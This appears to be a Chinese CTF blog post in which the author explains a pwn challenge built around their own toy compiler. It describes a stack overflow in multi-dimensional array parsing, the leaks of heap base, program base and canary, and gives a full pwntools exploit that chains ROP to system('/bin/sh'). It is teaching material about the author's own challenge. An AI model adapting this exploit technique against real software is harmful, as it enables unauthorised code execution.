      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/21/Compiler%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">Compiler出题思路</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-21 10:13:08 / Modified: 10:15:58" itemprop="dateCreated datePublished" datetime="2023-06-21T10:13:08+08:00">2023-06-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-Challenge/" itemprop="url" rel="index"><span itemprop="name">CTF Challenge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Compiler 出题思路</strong></p>
<p>本题目是一个我自己写的编译器，将其包装成菜单，并提供了以下4个功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>get IR</span><br><span class="line"><span class="number">2.</span>get <span class="keyword">asm</span></span><br><span class="line"><span class="number">3.</span>get bin</span><br><span class="line"><span class="number">4.</span>input code</span><br><span class="line"><span class="number">5.</span><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<ul>
<li>获取中间代码</li>
<li>获取汇编代码</li>
<li>获取二进制文件</li>
<li>输入源代码</li>
</ul>
<p>由于 “获取汇编代码” 这个功能会被逆向题目 SycLang 利用，于是本题目不提供 trans_asm 文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">  sub_CB6A(<span class="string">&quot;translation Three-address-codes to Assemble-code&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;./trans_asm&quot;</span>);</span><br><span class="line">  sub_CB6A(<span class="string">&quot;done: get demo.s&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">  sub_CB6A(<span class="string">&quot;translation Assemble-code to Binary-code&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;gcc demo.s -o demo&quot;</span>);</span><br><span class="line">  sub_CB6A(<span class="string">&quot;done: get demo&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：这里偷个懒，后端直接就是 gcc，同时这里也提供了 system 函数</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>本题目有两处溢出：</p>
<p>本题目在词法分析的过程中，对符号的长度和数目没有限制，但符号表却非常长，在这里进行入侵不太现实</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000020001</span> ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+qword_20001 dq <span class="number">30</span><span class="function">DBh <span class="title">dup</span><span class="params">(?)</span>                         </span>; <span class="number">0</span></span><br><span class="line">.bss:<span class="number">0000000000020001</span> ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; DATA XREF: .rodata:off_13000↑o</span><br><span class="line">.bss:<span class="number">00000000000386</span>D9 ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DA ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DB ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DC ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DD ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DE ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DF ??                            db    ? ;</span><br></pre></td></tr></table></figure>
<p>另外一处就是位于多级数组处理的栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub_427C(*(_QWORD *)(*(_QWORD *)(v15 + <span class="number">104</span>) + <span class="number">96LL</span>));</span><br><span class="line"><span class="keyword">if</span> ( **(_DWORD **)(*(_QWORD *)(v15 + <span class="number">104</span>) + <span class="number">96LL</span>) == <span class="number">258</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v18[v10++] = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v15 + <span class="number">104</span>) + <span class="number">96LL</span>) + <span class="number">40LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里原本的逻辑就是记录多级数组每一级的容量，如果多级数组的级数过多就会发生栈溢出</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v18[<span class="number">6</span>]; <span class="comment">// [rsp+4Ah] [rbp-16h]</span></span><br><span class="line"><span class="keyword">void</span> *v19; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里的 v19 是一个结构体指针，其目的是为了记录以变量为索引的数组（例如：<code>arr[i]</code> 中的 <code>i</code> 就会被进行记录）</li>
</ul>
<p>下面是这个结构体的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">Value</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> type_id[<span class="number">32</span>]; </span><br><span class="line">    <span class="keyword">int</span> type_int;     </span><br><span class="line">    <span class="keyword">float</span> type_float;</span><br><span class="line">    <span class="keyword">char</span> type_char;</span><br><span class="line">    <span class="keyword">char</span> type_string[<span class="number">32</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Array</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> kind;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">Value</span> <span class="title">value</span>;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Array</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>Array-&gt;name 存储有该符号的名称，它可以在多个地方被打印</li>
</ul>
<p>由于栈溢出，v19 可以被覆盖低位，进而将 Array-&gt;name 控制为我们需要的值</p>
<p>本程序有两处地方可供泄露：</p>
<p>当 Array-&gt;name 与符号表中的所有符号都不匹配时，就会发出报错：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v13 = sub_33AB(v14 + <span class="number">48</span>);</span><br><span class="line"><span class="keyword">if</span> ( v13 == <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  sub_3373(*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(*(_QWORD *)(a1 + <span class="number">96</span>) + <span class="number">200LL</span>), v14 + <span class="number">48</span>, <span class="string">&quot;未定义，语义错误&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在报错中会输出该符合的名称 Array-&gt;name</li>
</ul>
<p>当 Array-&gt;name 与符号表中任意一个符号匹配时，就会将其输出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; *(_DWORD *)(v11 + <span class="number">4</span>) - <span class="number">1</span>; ++i )</span><br><span class="line">  qword_19180 *= byte_19310[<span class="number">128</span> * (__int64)v7 + *(_DWORD *)(v11 + <span class="number">4</span>) - i];</span><br><span class="line"><span class="built_in">sprintf</span>(byte_190E0, <span class="string">&quot;&#123;#%d&#125;*&#123;%s&lt;+%d&gt;&#125;+&quot;</span>, qword_19180, (<span class="keyword">const</span> <span class="keyword">char</span> *)(v11 + <span class="number">16</span>), *(_QWORD *)(v11 + <span class="number">8</span>));</span><br><span class="line"><span class="built_in">strcat</span>(dest, byte_190E0);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>先通过栈溢出覆盖 Array 指针的低位，控制 Array-&gt;name 指向一个堆地址，进而泄露 heap_base</p>
<p>本程序在拷贝数据时没有进行初始化，因此有部分栈上的数据被拷贝到堆中，这些数据都可以通过 Array-&gt;name 进行泄露</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; canary </span><br><span class="line">canary : <span class="number">0x2ece71e5ac86af00</span></span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x2ece71e5ac86af00</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>\x00\xaf\x86\xac\xe5q\xce<span class="number">.&#x27;</span></span><br><span class="line">[heap]          <span class="number">0x55f0ee3be940</span> <span class="number">0x2ece71e5ac86af00</span></span><br><span class="line">[heap]          <span class="number">0x55f0ee3be9f8</span> <span class="number">0x2ece71e5ac86af00</span></span><br><span class="line">[heap]          <span class="number">0x55f0ee3bea30</span> <span class="number">0x2ece71e5ac86af00</span></span><br></pre></td></tr></table></figure>
<p>获取 heap_base 后，就可以将 Array-&gt;name 指向更大范围的堆空间，进而泄露 pro_base，canary</p>
<p>最后利用现成的 system 布置一个 ROP 就结束了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./trans_IR&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.77.77&#x27;</span>,<span class="string">&#x27;2102&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x72EC)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;5.exit&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    int a;</span></span><br><span class="line"><span class="string">    struct test t;</span></span><br><span class="line"><span class="string">	int arr[255][255][255][255][255][255][255];</span></span><br><span class="line"><span class="string">    arr[32][255][255][255][255][255][a]=0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;第6行：&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0xa970</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    int a;</span></span><br><span class="line"><span class="string">    struct test t;</span></span><br><span class="line"><span class="string">	int arr[255][255][255][255][255][255][255];</span></span><br><span class="line"><span class="string">    arr[48][255][255][255][255][255][a]=0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;第6行：&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0xa10a</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">bss_addr = pro_base + <span class="number">0x19040</span> + <span class="number">0x200</span></span><br><span class="line">system = pro_base + <span class="number">0xCD92</span></span><br><span class="line">pop_rdi = pro_base + <span class="number">0x00000000000125b3</span></span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;pop_rdi &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdi))</span><br><span class="line"></span><br><span class="line">stack_heap = heap_base + <span class="number">0x11f20</span> +<span class="number">1</span>-<span class="number">0x30</span> </span><br><span class="line">success(<span class="string">&quot;stack_heap &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_heap))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">stack_heaps = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    stack_heaps.append((stack_heap&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(stack_heaps)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    int a;</span></span><br><span class="line"><span class="string">    struct test t;</span></span><br><span class="line"><span class="string">	int arr[255][255][255][255][255][255][255][255][255];</span></span><br><span class="line"><span class="string">    arr[%s][%s][%s][255][255][255][255][255][a]=0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (stack_heaps[<span class="number">2</span>],stack_heaps[<span class="number">1</span>],stack_heaps[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;第6行：&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">canary_stack = leak_addr * <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;canary_stack &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary_stack))</span><br><span class="line"></span><br><span class="line">canary_stacks = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    canary_stacks.append((canary_stack&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(canary_stacks)</span><br><span class="line"></span><br><span class="line">bss_addrs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    bss_addrs.append((bss_addr&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(bss_addrs)</span><br><span class="line"></span><br><span class="line">systems = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    systems.append((system&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(systems)</span><br><span class="line"></span><br><span class="line">pop_rdis = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    pop_rdis.append((pop_rdi&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(pop_rdis)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">	cat ./flag;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">binsh = heap_base +<span class="number">0x199fe</span></span><br><span class="line">binshs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    binshs.append((binsh&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(binshs)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">	int arr[255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255];</span></span><br><span class="line"><span class="string">    arr[%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][0][0][0][0][0][0][0][0][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][255][255][255][255][255][255]=0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (systems[<span class="number">7</span>],systems[<span class="number">6</span>],systems[<span class="number">5</span>],systems[<span class="number">4</span>],</span><br><span class="line">       systems[<span class="number">3</span>],systems[<span class="number">2</span>],systems[<span class="number">1</span>],systems[<span class="number">0</span>],</span><br><span class="line">       binshs[<span class="number">7</span>],binshs[<span class="number">6</span>],binshs[<span class="number">5</span>],binshs[<span class="number">4</span>],</span><br><span class="line">       binshs[<span class="number">3</span>],binshs[<span class="number">2</span>],binshs[<span class="number">1</span>],binshs[<span class="number">0</span>],</span><br><span class="line">       pop_rdis[<span class="number">7</span>],pop_rdis[<span class="number">6</span>],pop_rdis[<span class="number">5</span>],pop_rdis[<span class="number">4</span>],</span><br><span class="line">       pop_rdis[<span class="number">3</span>],pop_rdis[<span class="number">2</span>],pop_rdis[<span class="number">1</span>],pop_rdis[<span class="number">0</span>],</span><br><span class="line">       canary_stacks[<span class="number">7</span>],canary_stacks[<span class="number">6</span>],canary_stacks[<span class="number">5</span>],canary_stacks[<span class="number">4</span>],</span><br><span class="line">       canary_stacks[<span class="number">3</span>],canary_stacks[<span class="number">2</span>],canary_stacks[<span class="number">1</span>],canary_stacks[<span class="number">0</span>],</span><br><span class="line">       bss_addrs[<span class="number">7</span>],bss_addrs[<span class="number">6</span>],bss_addrs[<span class="number">5</span>],bss_addrs[<span class="number">4</span>],</span><br><span class="line">       bss_addrs[<span class="number">3</span>],bss_addrs[<span class="number">2</span>],bss_addrs[<span class="number">1</span>],bss_addrs[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>出这个题目之前正好在学编译原理，我当时在做编译器 Lab 的时候就遇到了溢出的相关问题，于是就干脆把我做 Lab 时写的编译器拿出来改了改，弄了个 pwn 出来</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/20/VM%20pwn+%E5%A0%86%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/20/VM%20pwn+%E5%A0%86%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">VM pwn+堆溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
